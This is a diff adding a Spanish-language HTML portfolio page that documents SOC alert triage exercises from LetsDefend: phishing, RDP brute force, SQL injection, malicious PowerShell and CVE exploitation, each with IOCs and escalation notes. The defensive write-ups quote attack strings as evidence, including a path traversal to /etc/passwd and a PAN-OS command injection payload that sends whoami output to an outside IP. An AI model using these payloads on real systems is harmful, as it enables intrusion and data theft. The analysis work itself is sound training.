@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>CyberlifeSA</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Arial,sans-serif}
+body{background:#0b1120;color:#e5e7eb;line-height:1.6}
+header{height:40vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:40px;background:linear-gradient(rgba(2,6,23,0.88),rgba(2,6,23,0.96)),url("https://images.unsplash.com/photo-1558494949-ef010cbdcc31");background-size:cover;background-position:center}
+header h1{font-size:40px;color:#38bdf8}header p{max-width:900px;margin-top:10px}.btn{margin-top:20px;padding:10px 20px;background:#38bdf8;color:#020617;text-decoration:none;border-radius:8px;font-weight:bold}
+section{padding:60px 4%}.title{text-align:center;font-size:32px;color:#38bdf8;margin-bottom:30px}
+.table-wrap{overflow-x:auto;background:transparent;padding:20px;margin:40px auto;max-width:1600px}
+table{width:100%;border-collapse:collapse;min-width:900px;margin:0 auto}
+th,td{padding:12px 10px;border-bottom:1px solid #1e293b;text-align:left}
+th:first-child, td:first-child{min-width:220px;white-space:nowrap}
+th{background:#0f1724;color:#93c5fd;font-weight:600}
+tr:hover td{background:#0b1220}
+.tag{display:inline-block;background:#1e293b;padding:6px 10px;border-radius:999px;color:#cbd5e1;margin-right:6px;font-size:13px}
+.note-link{color:#38bdf8;text-decoration:none;font-weight:600}
+details{background:#111827;border:1px solid #1e293b;border-radius:12px;padding:14px;margin-top:10px}
+details div{white-space:pre-wrap;word-break:break-word;overflow-wrap:anywhere}
+details summary{cursor:pointer;color:#38bdf8;font-weight:700;outline:none;list-style:none}
+details summary::-webkit-details-marker{display:none}
+.sev{display:inline-block;padding:6px 10px;border-radius:8px;font-weight:700;font-size:13px}
+.sev.critical{background:#dc2626;color:#fff}.sev.alta{background:#c2410c;color:#fff}.sev.medium{background:#f59e0b;color:#020617}.sev.low{background:#10b981;color:#fff}
+.result{display:inline-block;padding:6px 10px;border-radius:8px;font-weight:700;font-size:13px}
+.result.tp{border:1px solid #10b981;color:#10b981;background:rgba(16,185,129,0.08)}
+.result.fp{border:1px solid #dc2626;color:#dc2626;background:rgba(220,38,38,0.08)}
+.code-box{display:inline-block;background:#111827;border:1px solid #334155;border-radius:8px;padding:2px 6px;margin:0 2px;font-family:Consolas,monospace;font-size:0.92em;color:#f8fafc}
+@media (max-width:700px){header h1{font-size:28px}.title{font-size:24px}}
+</style>
+
+</head>
+
+<body>
+
+<header>
+<h1>Alerts Triage - LetsDefend</h1>
+<p>Documentación de Triage de Alertas en un Centro de Operaciones de Seguridad (SOC), analisis de endpoints, correos y logs mediante SIEM.</p>
+<a href="index.html" class="btn">Volver</a>
+</header>
+
+<section>
+<h2 class="title">Alerts Dashboard</h2>
+
+<div class="table-wrap">
+	<table>
+		<thead>
+			<tr>
+				<th>Date</th>
+				<th>Identificador</th>
+				<th>Título</th>
+				<th>Severidad</th>
+					<th>Results</th>
+				<th>TTPs</th>
+				<th>Notas</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<td>Jan, 22, 2025, 02:37 AM</td>
+				<td>SOC335</td>
+				<td>Exploitation Detected (CVE-2024-49138)</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span><span class="tag">T1059</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Durante el análisis del endpoint Victor (<span class="code-box">172.16.17.207</span>), se identificó una cadena de ejecución iniciada mediante PowerShell el <span class="code-box">22-Jan-2025</span> a las <span class="code-box">14:36</span>. El proceso realizó consultas mediante <span class="code-box">whoami.exe</span> y <span class="code-box">whoami.exe /priv</span>, indicando actividades de descubrimiento del usuario y privilegios disponibles. Posteriormente, PowerShell ejecutó una descarga desde <span class="code-box">https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip</span>, la cual coincide con la ruta donde fue identificado el ejecutable sospechoso <span class="code-box">C:\temp\service_installer\svohost.exe</span>.
+
+						El archivo <span class="code-box">svohost.exe</span> presenta múltiples indicadores sospechosos, incluyendo similitud con procesos legítimos de Windows, ejecución desde una ubicación no estándar y detecciones YARA asociadas a herramientas maliciosas. La actividad observada es consistente con transferencia y ejecución de un posible payload malicioso.  Se escala a L2 Analyst para aislar el endpoint y profundizar en conexiones de red asociadas para verificar persistencia, a la vez realizar hunting de IP relacionada a ejecutable malicioso.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Aug, 07, 2026, 01:35 AM</td>
+				<td>SOC325</td>
+				<td>Unauthorized Cloud Region Access Attempt Detected</td>
+				<td>Low</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1110</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectaron múltiples intentos de autenticación hacia el servicio web <span class="code-box">app.letsdefend.io</span>, alojado en el activo <span class="code-box">AWS_Services</span> (<span class="code-box">52.15.206.21</span>), ejecutando Ubuntu 20.04.02 64-bit, utilizando la cuenta <span class="code-box">test@letsdefend.io</span> el día <span class="code-box">24-Sep-2024</span> a las <span class="code-box">08:21 AM</span>. La actividad fue generada por la regla Unauthorized Cloud Region Access Attempt Detected, debido a varios intentos de acceso desde una región cloud no autorizada para la organización.
+
+						Los registros del firewall muestran solicitudes POST <span class="code-box">/accounts/login</span> hacia el puerto <span class="code-box">443</span>, provenientes de la IP <span class="code-box">134.209.145.73</span>, las cuales fueron bloqueadas por el control de seguridad (action: <span class="code-box">blocked</span>, reason: <span class="code-box">access_denied</span>) con respuesta HTTP 403. No se observaron autenticaciones exitosas, cambios de configuración, generación de tokens ni actividad posterior asociada al usuario. Se confirma que la ip origen de estas peticiones es maliciosa.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Sep, 17, 2024, 12:05 PM</td>
+				<td>SOC326</td>
+				<td>Impersonating Domain MX Record Change Detected</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1598</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se recibió una alerta de Digital Risk Protection (Incident ID <span class="code-box">304</span>) el <span class="code-box">17-Sep-2024</span> a las <span class="code-box">12:05 PM</span>, informando un cambio en el registro MX del dominio <span class="code-box">letsdefwnd.io</span>, identificado como un dominio que suplanta la marca LetsDefend. El dominio, registrado en <span class="code-box">Sav.com, LLC</span>, actualizó su registro MX a <span class="code-box">mail.mailerhost.net</span>, lo que constituye un indicador de preparación para el envío o recepción de correos electrónicos y aumenta la probabilidad de que sea utilizado en campañas de phishing. La alerta fue enviada desde <span class="code-box">no-reply@cti-report.io</span> al buzón <span class="code-box">soc@letsdefend.io</span> y la acción del dispositivo fue <span class="code-box">Allowed</span>, correspondiente únicamente a la entrega del correo de notificación. Se recomienda validar que no se hayan recepcionado correos procedentes de este dominio a usuarios de la organización y solicitar takedown de dominio de validar uso malicioso/suplantación.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Jun, 06, 2024, 03:12 PM</td>
+				<td>SOC287</td>
+				<td>Arbitrary File Read on Checkpoint Security Gateway (CVE-2024-24919)</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó un intento de explotación dirigido al Checkpoint Security Gateway <span class="code-box">CP-Spark-Gateway-01</span> (<span class="code-box">172.16.20.146</span>) el 06-Jun-2024 a las 03:12 PM, originado desde la dirección IP <span class="code-box">203.160.68.12</span>. El atacante realizó solicitudes POST al recurso <span class="code-box">/clients/MyCRL</span> utilizando una cadena de Path Traversal (<span class="code-box">aCSHELL/../../../../../../../../../../etc/passwd</span>), patrón característico de explotación de la <span class="code-box">CVE-2024-24919</span>, con el objetivo de acceder a archivos sensibles del sistema.
+
+						La primera solicitud recibió una respuesta HTTP 200, indicando que el recurso solicitado fue procesado exitosamente y sugiriendo una posible lectura del archivo <span class="code-box">/etc/passwd</span>. Posteriormente, se observó un segundo intento dirigido al archivo <span class="code-box">/etc/shadow</span>, el cual fue rechazado con una respuesta HTTP 403 (Forbidden). Aunque la acción del dispositivo figura como Allowed, la evidencia confirma un intento de explotación contra el gateway y una posible divulgación de información sensible.
+
+						Se requiere una segunda revision para validar las acciones y poner en marcha acciones resolutorias de la vulnerabilidad explotada.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Mar, 07, 2024, 11:44 AM</td>
+				<td>SOC176</td>
+				<td>RDP Brute Force Detected</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1110</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó una actividad de fuerza bruta sobre el servicio RDP contra el host <span class="code-box">Matthew</span> (<span class="code-box">172.16.17.148</span>) el 07-Mar-2024 a las 11:44 AM, originada desde la dirección IP <span class="code-box">218.92.0.56</span>. Los registros del sistema evidencian un inicio de sesión exitoso mediante RDP (<span class="code-box">Logon Type 10</span> - RemoteInteractive) para la cuenta <span class="code-box">Matthew</span> (Event ID <span class="code-box">4624</span>), lo que confirma que el atacante obtuvo acceso al sistema tras los intentos de autenticación. Posteriormente, a las 11:46:34 AM, se observó la ejecución del comando <span class="code-box">net localgroup administrators</span> mediante <span class="code-box">cmd.exe</span>, utilizado para enumerar los miembros del grupo de administradores locales, comportamiento consistente con actividades de reconocimiento posteriores al compromiso. La conexión RDP fue <span class="code-box">Allowed</span> por el firewall. Se procede a realizar escalamiento a analista SOC L2 para profundizar mas en la actividad posterior y posible mecanisms de persistencia o movimientos laterales. Se recomienda aislamiento de endpoint y restablecimiento de credenciales de primera mano para luego validar reglas.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Mar, 07, 2024, 12:51 PM</td>
+				<td>SOC127</td>
+				<td>SQL Injection Detected in Web Application</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span><span class="tag">T1059</span><span class="tag">T1071</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						- 7 de marzo de 2024, 12:51 p. m. - SOC127 - Se activó la detección de inyección SQL
+						- Se detectó una solicitud HTTP que contenía inyecciones SQL y cargas útiles para la ejecución de comandos
+						- Acción del dispositivo: Permitida
+
+						- Host: <span class="code-box">WebServer1000</span>
+						- IP de destino: <span class="code-box">172.16.20.12</span>
+						- Servicio objetivo: <span class="code-box">Aplicación web (HTTP)</span>
+
+						- IP del atacante: <span class="code-box">118.194.247.28</span>
+						- Activo objetivo: <span class="code-box">WebServer1000</span>
+						- Servicio afectado: <span class="code-box">Aplicación web / Base de datos</span>
+
+						El atacante intentó explotar una aplicación web vulnerable mediante técnicas de inyección SQL.
+						La solicitud contenía sentencias UNION SELECT para enumerar información de la base de datos a través de information_schema, seguidas de un intento de ejecutar comandos del sistema mediante xp_cmdshell.
+						La carga útil también incluía un intento de inyección de script XSS.
+						La solicitud fue permitida por el dispositivo de seguridad y devolvió un código HTTP 200, lo que requiere una validación adicional para determinar si la explotación fue exitosa.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Dirección IP de origen: <span class="code-box">118.194.247.28</span> (origen de la inyección SQL)
+						- Dirección IP de destino: <span class="code-box">172.16.20.12</span>
+						- Host: <span class="code-box">WebServer1000</span>
+						- Indicadores de carga útil:
+						- <span class="code-box">UNION SELECT</span>
+						- <span class="code-box">information_schema.tables</span>
+						- <span class="code-box">xp_cmdshell</span>
+						- <span class="code-box">Carga útil de script XSS</span>
+
+						Se confirmó un intento malicioso de inyección SQL dirigido a WebServer1000.
+						El atacante intentó enumerar la base de datos y posiblemente ejecutar comandos remotos a través de la aplicación web.
+						Se escala el caso al SOC L2 Analyst para una investigación más exhaustiva.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Mar, 14, 2024, 05:23 PM</td>
+				<td>SOC153</td>
+				<td>Script de PowerShell sospechoso ejecutado</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1059</span></td>
+				<td>
+					<details>
+						<summary>Detalles</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó actividad sospechosa en el endpoint Tony (<span class="code-box">172.16.17.206</span>) relacionada con la ejecución de un script de PowerShell descargado desde una fuente externa el <span class="code-box">14 de marzo de 2024</span> a las <span class="code-box">17:23</span>.
+
+						Durante el análisis se identificó la ejecución del script <span class="code-box">payload_1.ps1</span>, ubicado en la ruta <span class="code-box">C:\Users\LetsDefend\Downloads\payload_1.ps1</span>, cuyo hash <span class="code-box">db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0</span> fue identificado como malicioso mediante herramientas de análisis de amenazas. El archivo fue descargado inicialmente desde la infraestructura externa <span class="code-box">files-ld.s3.us-east-2.amazonaws.com</span>.
+
+						Posteriormente, el script utilizó PowerShell para descargar y ejecutar contenido adicional desde el dominio <span class="code-box">kionagranada.com</span>, identificado como infraestructura asociada a comando y control. La actividad observada corresponde a la ejecución de código remoto mediante PowerShell, una técnica comúnmente utilizada para la descarga de cargas maliciosas adicionales y ejecución de malware.
+
+						La investigación determinó que el script intentó establecer comunicación con infraestructura externa maliciosa y ejecutar componentes adicionales dentro del sistema. Los controles de seguridad detectaron la actividad y realizaron el aislamiento del endpoint para limitar una posible ejecución posterior, propagación o movimiento lateral dentro del entorno.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>				<td>Jun, 21, 2026, 06:55 AM</td>
+				<td>SOC141</td>
+				<td>Phishing URL Detected</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1566</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó tráfico web saliente desde el endpoint interno <span class="code-box">172.16.17.49</span> hacia el dominio externo identificado como malicioso <span class="code-box">mogagrocol.ru</span> el día <span class="code-box">22 de marzo de 2021</span> a las <span class="code-box">21:23</span>. La actividad corresponde a un intento de acceso a una URL asociada con infraestructura de phishing conocida. 
+						
+						La conexión inicial fue permitida, pero las solicitudes posteriores fueron bloqueadas por los controles de seguridad del firewall/proxy, evitando la continuidad de la comunicación con el dominio malicioso. El evento se originó desde el equipo interno mediante una solicitud HTTP/HTTPS hacia <span class="code-box">mogagrocol.ru</span>, lo que puede indicar que un usuario interactuó con un enlace de phishing o accedió a contenido asociado con una campaña maliciosa. Debido a la conexión inicial permitida, el endpoint queda asociado a una posible exposición frente a amenazas como descarga de archivos maliciosos, robo de credenciales o ejecución de contenido no autorizado. La actividad fue registrada como tráfico web saliente desde el endpoint <span class="code-box">172.16.17.49</span> hacia infraestructura externa maliciosa detectada por los controles de seguridad.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Mar, 21, 2021, 12:26 PM</td>
+				<td>SOC140</td>
+				<td>Phishing Mail Detected - Suspicious Task Scheduler</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1566</span><span class="tag">T1053</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó un correo electrónico enviado desde aaronluo@cmail.carleton.ca hacia mark@letsdefend.io, el cual generó la alerta SOC140 - Correo electrónico de phishing detectado: Programador de tareas sospechoso. El correo contenía un archivo PDF adjunto identificado como malicioso. El archivo con hash 39fb927c32221134a423760c5d1f58bca4cbbcc87c891c79e390a22b63608eb4 fue analizado en VirusTotal, donde fue clasificado como Troyano PDF Fraud AD. El análisis dinámico realizado en ANY.RUN mostró intentos de comunicación con infraestructura de comando y control asociada a la dirección IP 69.39.225.3 y al dominio pomf.cat. 
+						
+						Los controles de seguridad del correo electrónico bloquearon el mensaje antes de su entrega al destinatario, evitando que el archivo adjunto pudiera ser abierto o ejecutado. La revisión de registros confirmó que no se observaron comunicaciones salientes hacia la infraestructura C2 identificada. El evento ocurrió el 21 de marzo de 2021 a las 12:26 PM, relacionado con el Event ID 82 y la regla SOC140 - Correo electrónico de phishing detectado: Programador de tareas sospechoso. La alerta fue cerrada posteriormente el 21 de enero de 2026 a las 3:23 PM. La evidencia recopilada corresponde a un intento de distribución de un archivo PDF malicioso mediante correo electrónico.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Feb, 07, 2021, 04:24 AM</td>
+				<td>SOC120</td>
+				<td>Phishing Mail Detected - Internal to Internal</td>
+				<td>Medium</td>
+				<td><span class="result fp">FP</span></td>
+				<td><span class="tag">T1566</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+					A las 04:24 AM del 07-Feb-2021, se generó una alerta por Phishing Mail Detected - Internal to Internal para un correo enviado desde <span class="code-box">john@letsdefend.io</span> hacia <span class="code-box">susie@letsdefend.io</span>. Tras la revisión, el mensaje con asunto <span class="code-box">"Meeting"</span> y contenido <span class="code-box">"Hi Susie, Can we arrange a meeting today if you are available?"</span> corresponde a una comunicación interna legítima.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>May, 13, 2024, 09:22 AM</td>
+				<td>SOC282</td>
+				<td>Phishing Alert - Deceptive Mail Detected</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1566</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó un correo de phishing dirigido al usuario <span class="code-box">Felix@letsdefend.io</span>, el cual fue entregado exitosamente (Device Action: <span class="code-box">Allowed</span>). Tras la interacción con el correo, el usuario descargó el archivo <span class="code-box">free-coffee.zip</span> desde <span class="code-box">files-ld.s3.us-east-2.amazonaws.com</span>, del cual posteriormente se ejecutó <span class="code-box">Coffee.exe</span> desde <span class="code-box">C:\Users\Felix\Downloads\</span> bajo el contexto del usuario <span class="code-box">EC2AMAZ-ILGVOIN\Felix</span> (PID <span class="code-box">6697</span>), siendo iniciado por <span class="code-box">explorer.exe</span>. Inmediatamente después de la ejecución se observó una secuencia de comandos ejecutados mediante <span class="code-box">cmd.exe</span>, incluyendo <span class="code-box">systeminfo</span>, <span class="code-box">hostname</span>, <span class="code-box">wmic logicaldisk</span>, <span class="code-box">net user</span>, <span class="code-box">tasklist /svc</span>, <span class="code-box">ipconfig /all</span> y <span class="code-box">route print</span>, comportamiento consistente con actividades de reconocimiento destinadas a recopilar información del sistema, usuarios, procesos, discos y configuración de red. Se procede a aislar el endpoint y a analizar el ejecutable malicioso <span class="code-box">Coffee.exe</span>.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Apr, 18, 2024, 03:09 AM</td>
+				<td>SOC274</td>
+				<td>Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)</td>
+				<td>Critical</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span><span class="tag">T1210</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó un intento de explotación dirigido al firewall <span class="code-box">PA-Firewall-01</span> (<span class="code-box">172.16.17.139</span>) el 18-Apr-2024 a las 03:09 PM, mediante una solicitud POST a <span class="code-box">/global-protect/login.esp</span>. La petición contenía una cookie especialmente manipulada con una carga útil de command injection <span class="code-box">curl${IFS}144.172.79.92:4444?user=$(whoami)</span>, coincidente con los patrones de explotación de la <span class="code-box">CVE-2024-3400</span>. Los registros de PAN-OS muestran que el payload fue procesado por el componente <span class="code-box">device telemetry (dt_send)</span>, el cual intentó ejecutar el comando inyectado y realizar una conexión hacia la dirección IP <span class="code-box">144.172.79.92</span>. La ejecución no se completó exitosamente, registrándose el error <span class="code-box">"DNS lookup failed"</span> durante el intento de conexión. Aunque la acción del dispositivo figura como Allowed, la evidencia confirma un intento de explotación contra el servicio <span class="code-box">GlobalProtect</span>. Se procede a verificar versión PAN-OS en busca de vulnerabilidades relacionadas al CVE mencionado y análisis de IP atacante en búsqueda de posible actividad posterior. Puesta en marcha de actualización/parche PAN-S.
+						</div>
+					</details>
+				</td>
+			</tr>
+		</tbody>
+		</table>
+</div>
+
+</section>
+
+<footer>CyberlifeSA</footer>
+
+<script>
+// Detect severity text and wrap with badges (case-insensitive)
+document.addEventListener('DOMContentLoaded', function(){
+	document.querySelectorAll('table tbody tr').forEach(function(row){
+		var cells = row.querySelectorAll('td');
+		if(cells.length < 4) return;
+		var sevCell = cells[3];
+		var txt = sevCell.textContent.trim();
+		var key = txt.toLowerCase();
+		var span = document.createElement('span');
+		span.classList.add('sev');
+		span.textContent = txt;
+		if(key.indexOf('critical') !== -1) span.classList.add('critical');
+					else if(key.indexOf('high') !== -1) span.classList.add('alta');
+		else if(key.indexOf('medium') !== -1) span.classList.add('medium');
+		else if(key.indexOf('low') !== -1) span.classList.add('low');
+		// replace content
+		sevCell.textContent = '';
+		sevCell.appendChild(span);
+	});
+});
+</script>
+
+</body>
+
+</html>
+
